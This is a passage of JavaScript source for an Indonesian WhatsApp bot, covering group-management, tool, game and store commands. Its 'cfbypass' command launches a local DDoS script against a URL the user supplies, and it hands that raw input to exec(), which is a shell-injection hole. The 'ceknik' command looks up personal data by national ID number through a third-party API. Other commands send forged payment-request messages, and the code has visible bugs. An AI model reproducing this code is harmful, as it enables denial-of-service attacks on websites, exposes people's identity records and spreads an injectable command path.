                        console.log(`Meng-${subCommand} participant dengan JID: ${request.jid}`);
                    }
                    reply(`*${subCommand === 'approve' ? 'Menyetujui' : 'Menolak'} Permintaan Bergabung:*\n\n${formattedResponse}`);
                } else {
                    reply("Tidak ada anggota yang cocok untuk reject/approve.");
                }
            }
        }
    } catch (err) {
        console.log(jsonformat(err))
    }
    }
    break

case 'kick': {
    if (!m.isGroup) return m.reply(mess.group)
    if (!isBotAdmins) return m.reply(mess.badm)
    if (!isAdmins) return m.reply(mess.admin)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    await dy.groupParticipantsUpdate(from, [users], 'remove')
    m.reply(mess.done)
    }
    break

case 'opentime': {
if (!m?.isGroup) return reply("Khusus Dalam Group")
if (!isAdmins && !isCreator) return reply("Khusus Admin Group")
if (!isBotAdmins) return reply("Jadikan Bot Sebagai Admin Terlebih Dahulu Jika Ingin Menggunakan Fitur Ini")
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
dy.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}
break

case 'askgpt': {
    if (!text) return m.reply("Silakan masukkan pertanyaan untuk ChatGPT!");

    try {
        const response = await fetch(`https://devolution-cyan.vercel.app/ai/chatgpt?text=${encodeURIComponent(text)}`);
        const result = await response.json();

        if (result.status !== 200 || !result.data) {
            return m.reply("Tidak ada jawaban dari ChatGPT.");
        }

        m.reply(`${result.data}`);
    } catch (error) {
        m.reply("Terjadi kesalahan: " + error.message);
    }
    break;
}




case 'promote':{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted)reply('masukkan nomor yang ingin di promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dy.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
        
case 'demote':{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted)reply('masukkan nomor yang ingin di demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dy.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break      

case 'linkgroup': case 'linkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
let response = await dy.groupInviteCode(from)
dy.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

 case 'setnamagc': case 'namegc': {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botadmin)
if (!isAdmins && !isCreator) return reply(mess.admin)
if (!text) return reply('teksnya')
dy.groupUpdateSubject(m.chat, text)
reply(mess.done)}
break

case 'creategc': {

    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply("Nama groupnya?")
    let cret = await dy.groupCreate(text, [])
    let response = await dy.groupInviteCode(cret.id)
    let teks = `\`\`\`「 CREATION GROUP MESSAGE 」\`\`\`
▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
    setTimeout(() => {
        reply(teks)
    }, 7000)
    setTimeout(() => {
        dy.groupParticipantsUpdate(cret.id, [m.sender], "promote")
    }, 5000)
    setTimeout(() => {
        dy.groupParticipantsUpdate(cret.id, [m.sender], "add")
    }, 1000)
    }
    break

case 'hidetag': case 'ht': case 'h': {
    
    dy.sendMessage(from, {
        text: m.quoted? m.quoted.text : text ? text : '',
        mentions: participants.map(a => a.id)
    }, {
        quoted: fverif
    })
    }
    break

case 'setppgc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botadmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (/image/g.test(mime)) {
let media = await dy.downloadAndSaveMediaMessage(qmsg)
await dy.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
m.reply(mess.done)
} else return m.reply('dengan mengirim foto')
}
break

case 'cekasalmember': {
  if (!m.isGroup) return m.reply(mess.group)
  const participants = await dy.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  reply(replyMessage);
  }
  break

case 'welcome': {
if (!isCreator) return reply('Ngapain ? Fitur Ini Khusus Tuan Saya😜')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await dy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
dy.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
reply('Sukses Mematikan Welcome  di group ini')
}
}
break

//BATAS GROUP MENU

//TOOLS MENU

case 'ocr': {
       if (!quoted) return reply(`reply image`)
       if (!/image/.test(mime) && !/webp/.test(mime)) return reply(`Reply Image`)
        let img = await quoted.download()
       try {
        let anu = await (await Tesseract.recognize(img, 'eng')).data.text
        reply(`*Result :*\n${anu}`)
       } catch (e) {
        console.log(e)
        m.reply('failed to read text.')
       }
      }
      break

case 'getpp': {
    dy.sendImage(m.chat, ppuser, mess.success, m)
    }
    break

case 'enc': {
    if (!text) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
    let meg = await Scraper.Tools.obfus(text)
    m.reply(`${meg.result}`)
    }
    break
case 'emi': {
    if (!text) return reply(`Masukkan teks atau prompt untuk menghasilkan gambar. Contoh: ${command} futuristic city`)
    
    try {
        // Fetch the generated image using Scraper
        let image = await Scraper.Emi.fetchData(text)
        let result = Buffer.from(image, "base64") // Convert base64 image to buffer

        // Send the result back
        dy.sendImage(m.chat, result, `Berhasil menghasilkan gambar untuk prompt: "${text}"`, m)
    } catch (error) {
        reply(`Gagal menghasilkan gambar. Error: ${error.message}`)
    }
}
break

case 'removebg': {
    if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${command}`)
    if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${command}`)
    if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${command}`)
    let img = await quoted.download()
    let image = await Scraper.Tools.removeBg(img)
    let result = await Buffer.from(image, "base64")

    dy.sendImage(m.chat, result, mess.success, m)
    }
    break

case 'tourl': {
    if (!/video/.test(mime) && !/image/.test(mime)) {
        return m.reply(`Reply gambar atau video dengan keterangan/caption ${prefix + command}`);
    }

    try {
        const pnis = m.quoted ? m.quoted : m; 
        const media = await pnis.download();
        const link = await TelegraPh(media); 
        await dy.sendMessage(m.chat, { text: `Here is your link:\n${link}` }, { quoted: fverif });
    } catch (err) {
        m.reply('Terjadi kesalahan saat mengunggah file: ' + err.message);
    }
}
break;


case 'git': case 'gitclone': {
    if (!args[0]) return m.reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
    if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
    let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {
        method: 'HEAD'
    })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    dy.sendMessage(m.chat, {
        document: {
            url: url
        },
        fileName: filename + '.zip',
        mimetype: 'application/zip'
    }, {
        quoted: fverif
    }).catch((err) => reply('emror'))
    }
    break  

case 'ceknik': {
    if (!text) return m.reply('Masukkan NIK untuk dicek!\nContoh: !ceknik 3212156608870002');

    let ngeCek = `https://skizoasia.xyz/api/checknik?apikey=dycoders&nik=${text}`;

    try {
      
        let response = await fetch(ngeCek);
        let json = await response.json();

       
        if (json.status !== 200 || !json.message) {
            return m.reply('Gagal.');
        }

      
        let messageData = JSON.stringify(json.message, null, 2);
        await dy.sendMessage(from, {
            text: `BRUHH\n\n${messageData}`
        }, { quoted: fverif });

    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat memproses permintaan. Coba lagi nanti.');
    }
}
break;







case 'tts': {
    if (!text) return reply(`Example : ${prefix + command} text`)
        let tts = await Scraper.Tools.Tts(text, "id")
        dy.sendMessage(m.chat, {
            audio: tts,
            ptt: true,
            mimetype: "audio/mpeg",
            fileName: "vn.mp3",
            waveform: [100, 0, 100, 0, 100, 0, 100]
        }, {
            quoted: fverif
        });
    }
    break

case 'tr':
case 'translate':{
let lang, text
if (limitnya < 1) return m.reply(mess.limit)
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else return reply(`Ex: ${prefix + command} id hello i am robot`)
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return m.reply(`Error : Bahasa"${lang}" Tidak Support`)
reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
uselimit()
}
break

//BATAS TOOLS MENU

//GAME MENU

case 'tebakbomb': case 'bomb': {
if (!m.isGroup) return reply(mess.group)
if (m.chat in dy.bomb) return dy.sendText(m.chat, "Masih ada game yang belum terselsaikan!", dy.bomb[m.chat][0]);
dy.bomb = dy.bomb ? dy.bomb : {};
let id = m.chat,
timeout = 180000;
const bom = ['💥', '✅', '✅', '✅', '✅', '✅', '✅', '✅', '✅'].sort(() => Math.random() - 0.5);
const number = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];
const array = bom.map((v, i) => ({
emot: v,
number: number[i],
position: i + 1,
state: false
}));
let teks = `*🎮 GAME TEBAK BOM 🎮*\n\nKirim angka *1* - *9* untuk membuka *9* kotak nomor di bawah ini :\n\n`;
for (let i = 0; i < array.length; i += 3) teks += array.slice(i, i + 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += `\nWaktu : *${((timeout / 1000) / 60)} menit*\nHadiah : *Random Balance*\n\nApabila mendapat kotak yang berisi bom maka *Hadiah* tidak di berikan`;
let msg = await dy.sendText(m.chat, teks, dy.bomb[id] ? dy.bomb[id][0] : m);
let { key } = msg

let v;
dy.bomb[id] = [
msg,
array,
setTimeout(() => {
v = array.find(v => v.emot == '💥');
if (dy.bomb[id]) dy.sendText(m.chat, `*Waktu habis*\n\nKotak yang berisi bom ${v.number} tidak terbuka\nGame dihentikan!`, dy.bomb[id][0]);
delete dy.bomb[id];
}, timeout),
key
];
}
break



case 'openai': {
    if (!text) {
        return m.reply('Masukkan teks yang ingin diproses!\nContoh: !openai Apa itu AI?');
    }

    try {
        // Pisahkan teks utama dan logika tambahan
        const [inputText, ...logicArray] = text.split('|');
        const logic = logicArray.join('|').trim() || "Default logic";

        // Panggil fungsi openai
        const result = await openai(inputText.trim(), logic);

        // Validasi hasil
        if (!result || !result.content) {
            return m.reply('Gagal mendapatkan respons dari OpenAI. Coba lagi nanti.');
        }

        // Kirim hasil respons ke pengguna
        await dy.sendMessage(from, {
            text: `${result.content}`,
        }, { quoted: fverif });

    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat memproses permintaan. Coba lagi nanti.');
    }
}
break;


case 'yandex': {
    const mime = (m.quoted ? m.quoted.mtype : '') || '';
    if (!m.quoted) return m.reply("Reply gambar yang ingin dicari menggunakan perintah ini.");
    if (!/image/.test(mime)) return m.reply(`Fitur ini hanya mendukung gambar.`);

    try {
     
        const media = await m.quoted.download();
        if (!media) return m.reply('Gagal mengunduh gambar. Coba lagi.');

      
        const result = await YandexReverse(media);
      
        if (!result || !result.link || !result.teks) {
            return m.reply('Tidak ditemukan hasil untuk gambar ini.');
        }

       
        let message = `🔎 *Yandex Reverse Image Search*\n\n`;
        message += `🌐 *Link Hasil:* ${result.link}\n\n`;
        message += `📋 *Deskripsi Hasil:*\n${result.teks}`;

        await dy.sendMessage(from, {
            text: message.trim(),
            contextInfo: {
                externalAdReply: {
                    title: 'Yandex Reverse Search',
                    body: 'Hasil pencarian balik gambar',
                    mediaUrl: result.link,
                    renderLargerThumbnail: true,
                },
            },
        }, { quoted: m });
    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat melakukan pencarian. Coba lagi nanti.');
    }
}
break;

case 'casino': {
if (!m.isGroup) return reply(mess.group)
let buatall = 1
dy.casino = dy.casino ? dy.casino : {}
if (m.chat in dy.casino) return reply('Masih Ada Yang Melakukan Casino Disini, Tunggu Sampai Selesai!!')
else dy.casino[m.chat] = true
try {
let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
let Aku = (randomaku * 1)
let Kamu = (randomkamu * 1)
let count = args[0]
count = count ? /all/i.test(count) ? Math.floor(db.data.users[m.sender].balance / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
count = Math.max(1, count)
if (args.length < 1) return reply(`${prefix}casino <jumlah>\n${prefix}casino 1000`)
if (db.data.users[m.sender].balance >= count * 1) {
db.data.users[m.sender].balance -= count * 1
if (Aku > Kamu) {
reply(`💰 Casino 💰\n*${pushname}:* ${Kamu} Point\n*${botname}:* ${Aku} Point\n\n*Kamu Kalah*\nKamu Kehilangan ${count} Balance`)
} else if (Aku < Kamu) {
db.data.users[m.sender].balance += count * 2
reply(`💰 Casino 💰\n*${pushname}:* ${Kamu} Point\n*${botname}:* ${Aku} Point\n\n*Kamu Kalah*\nKamu Mendapatkan ${count * 2} Balance`)
} else {
ldb.data.users[m.sender].balance += count * 1
reply(`💰 Casino 💰\n*${pushname}:* ${Kamu} Point\n*${botname}:* ${Aku} Point\n\n*Seri*\nKamu Mendapatkan ${count * 1} Balance`)
}
} else reply(`Balance Kamu Tidak Mencukupi Untuk Casino Silahkan *bermain game* Terlebih Dahulu!`)
} catch (e) {
console.log(e)
reply(mess.error)
} finally {
delete dy.casino[m.chat]
}
}
break

case 'caklontong':
//if(!isGroup) return m.reply(mess.group)
if (from in caklontong) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./media/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await m.reply(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break







case 'tebakgambar':
//if(!isGroup) return m.reply(mess.group)
if (from in tebakgambar2) return m.reply('Masih ada game yang belum diselesaikan');
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./media/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await dy.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: fverif})
tebakgambar2[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakgambar2[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar2[from].jawaban}`);
delete tebakgambar2[from];
}, gamewaktu * 1000)
}
break

case 'family100': case 'f100':
//if(!isGroup) return m.reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./media/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await m.reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
m.reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}
break 

case 'tebakbendera':
//if(!isGroup) return m.reply(mess.group)
if (from in tebakbendera) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./media/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break

case 'coin': {
if (!args || !args[0]) return reply(`🚩 Berikan argumen A atau B.`)
      let x = Func.ucword(args[0])
      if (x == 'A' || x == 'B') {
         var typeC = Func.random(['A', 'B'])
         if (Func.ucword(args[0]) == typeC) {
            let percent = Func.randomInt(5, 10)
            let reward = ((percent / 100) * users.balance)
            users.balance += reward
            let last = users.balance
            let teks = `  *W I N*\n\n`
            teks += `	*System* : ${typeC}, *You* : ${Func.ucword(args[0])}!\n`
            teks += `	*+ ${Func.formatNumber(reward)}*\n\n`
            teks += ` *Total* : ${Func.formatNumber(last)} Point\n\n`
            teks += `*NB : “Anti-Spam jeda ${global.gamewaktu} detik untuk eksekusi selanjutnya.”*`
            reply(teks)
         } else if (Func.ucword(args[0]) != typeC) {
            let percent = Func.randomInt(5, 15)
            let reward = ((percent / 100) * users.balance)
            users.balance -= reward
            let last = users.balance
            let teks = `  *L O S E*\n\n`
            teks += `	*System* : ${typeC}, *You* : ${Func.ucword(args[0])}!\n`
            teks += `	*- ${Func.formatNumber(reward)}*\n\n`
            teks += ` *Total* : ${Func.formatNumber(last)} Point\n\n`
            teks += `*NB : “Anti-Spam jeda ${global.gamewaktu} detik untuk eksekusi selanjutnya.”*`
            reply(teks)
         }
      } else {
         return reply(`🚩 Hanya terdapat argumen A dan B.`)
      }
}
break

case 'suit': {
if(!m.isGroup) return reply(mess.group)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) return reply(`Selesaikan suit mu yang sebelumnya`)
mark = `0@s.whatsapp.net`
if (!froms) return reply(`Siapa yang ingin kamu tantang?\nTag orangnya!\n\nContoh: *${command}* @${mark.split('@')[0]}`)
if (froms === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply(`Sad amat main ama diri sendiri`)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(froms))) return reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :)`)
var hadiah = Func.randomInt(bmin, bmax)
let poin = 1000
let poin_lose = 1000
let timeout = 60000
let id = 'suit_' + new Date() * 1
suit[id] = {
chat: await reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit dengan taruhan Saldo Rp. 2,000\n\n*Kirim (gas/gamau)* untuk bermain\n\n*Hadiah Pemenang :* Rp. 1,000\n*Hukuman Kalah* : - Rp. 1,000`),
id: id,
p: sender,
p2: froms,
status: 'wait',
hadiah: hadiah,
waktu: setTimeout(() => {
if (suit[id]) dy.sendMessage(from, {text: `_Waktu suit habis!_` })
delete suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'slot': {
if (!m.isGroup) return reply(mess.group)
let hadiah = randomNumber(2000, 3000)
let emojis = ["😹", "🧢", "🗿"]
let a = Math.floor(Math.random() * emojis.length)
let b = Math.floor(Math.random() * emojis.length)
let c = Math.floor(Math.random() * emojis.length)
let x = [],
y = [],
z = []
for (let i = 0; i < 3; i++) {
x[i] = emojis[a]
a++
if (a == emojis.length) a = 0
}
for (let i = 0; i < 3; i++) {
y[i] = emojis[b]
b++
if (b == emojis.length) b = 0
}
for (let i = 0; i < 3; i++) {
z[i] = emojis[c]
c++
if (c == emojis.length) c = 0
}
let end
if (a == b && b == c) {
end = `JACKPOT! *$${hadiah} point*`
db.data.users[m.sender].balance += hadiah
} else if (a == b || a == c || b == c) {
end = `Hampir Beruntung! *+1 Limits*`
db.data.users[m.sender].limit += 1
} else {
end = `LOSE! *-$${hadiah}*`
if (hadiah > db.data.users[m.sender].balance) {
ldb.data.users[m.sender].balance = 0
} else {
db.data.users[m.sender].balance -= hadiah
}
}
let teks = `  *S L O T S*\n\n`
teks += `	[ ${x[0]} ${y[0]} ${z[0]} ]\n`
teks += `	[ ${x[1]} ${y[1]} ${z[1]} ]\n`
teks += `	[ ${x[2]} ${y[2]} ${z[2]} ]\n`
teks += `\n${end}`
reply(teks)
}
break
case 'tictactoe': case 'ttt': case 'ttc': case 'xox':
if (!m.isGroup) return reply(mess.group)
if (from in tictactoe) return reply(`Masih ada game yang blum selesai`)
if (!froms) return reply(`Kirim perintah *${command}* @tag atau reply pesan orangnya!`)
if (froms === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply(`Sad amat main ama diri sendiri`)
var hadiah = randomNumber(10, 20)
await reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain TicTacToe\n\n*Kirim (Y/N)* untuk bermain\n\nHadiah : ${hadiah} balance`)
tictactoe[from] = {
id: from,
status: null,
hadiah: hadiah,
penantang: sender,
ditantang: froms,
TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
}
break
case 'delttt': case 'delttc':
if (!m.isGroup) return reply(mess.group)
if (!(from in tictactoe)) return reply(`Tidak ada sesi game tictactoe di grup ini`)
if (isAdmins || isOwner) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].penantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].ditantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else {
reply(`Anda tidak bisa menghapus sesi tictactoe karena bukan pemain!`)
}
break
//BATAS GAME MENU

//STORE MENU

case 'tunda':
text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`
await dy.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxpending,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break

case 'batal':
text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`
await dy.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxbatal,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break

case 'done': {

if (!text) return m.reply("barang,harga\n\n*Contoh :* Panel Unlimited,2")
if (!text.split(",")) return m.reply("barang,harga\n\n*Contoh :* Panel Unlimited,2")
const [barang, harga] = text.split(",")
if (isNaN(harga)) return m.reply("Format Harga Tidak Valid")
var total = `${harga}000000`
var total2 = Number(`${harga}000`)
const teks = `*TRANSAKSI DONE BY ${ownername} ✅*

*📦 Barang :* ${barang}
*💸 Nominal :* Rp${toRupiah(total2)}
*⏰ Waktu :* ${time}

_*Terimakasih Sudah Mempercayai & Menggunakan Jasa Saya 🥳*_`
 dy.relayMessage(m.chat, {
    requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        amount1000: Number(total),
        requestFrom: m.sender,
        noteMessage: {
            extendedTextMessage: {
                text: teks,
                contextInfo: {
                    mentionedJid: ['639104403021@s.whatsapp.net'],
                    groupMentions: [/* Add group mentions if needed */],
                    isForwarded: true,
                    fromMe: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363303267333730@newsletter',
                        newsletterName: "dycoders",
                        serverMessageId: -1
                    },
                    externalAdReply: {
                        showAdAttribution: true
                    }
                }
            }
        }
    }
}, {});

break
}
// Perintah enable/disable antilink
case 'antilinkv1':
    if (!isCreator) return reply(mess.owner);
    if (args[0] === 'enable') {
        if (chats.antilink) return reply('Fitur antilink sudah aktif!');
        chats.antilink = true;
        reply('Fitur antilink telah diaktifkan.');
    } else if (args[0] === 'disable') {
        if (!chats.antilink) return reply('Fitur antilink sudah nonaktif!');
        chats.antilink = false;
        reply('Fitur antilink telah dimatikan.');
    } else {
        reply('Gunakan: *antilinkv1 enable/disable*');
    }
    break;


//JADIBOTMENU

case 'jadibot':{
if (!isPremium) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
jadibot(dy, m, from)
}
break

case 'stopjadibot':{
if (!isPremium) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
stopjadibot(dy, from)
}
break

case 'listjadibot':{
if (!isPremium) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
listjadibot(dy, m)
}
break

case 'cfbypass':{
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`this is how to use it ${prefix + command} <url> <time>`)
let url = q.split(" ")[0]
let time = q.split(" ")[1] * 10
reply(`*[  !  ]  successful ddos web with the following format* :
> method: ${command} 
> Target: ${url} 
> Duration: ${time}

Don't use it too much, because it will have fatal consequences for you (user panel)`)
exec(`node ./lib/ddos/CFBypass.js ${url} ${time}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break 

//RPG MENU
case 'joinrpg':{
if (!m.isGroup) return m.reply("Khusus Group")
if (isPetualang) return m.reply('Kamu Telah join sebelumnya')
users.petualang = true
let itu = 'https://telegra.ph/file/a4ec01498e764ae42c8c4.jpg'
dy.sendMessage(m.chat, {image:{url: itu}, caption: 'Sukses join Rpg games' }, {quoted:m})
}
break
//BATAS RPG MENU


// cpanel function


case '1gb': {
    if (!isPremium) return m.reply(mess.premium);
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username,nomor`);

    let username = t[0].trim();
    let inputNumber = t[1].replace(/[^0-9]/g, '');
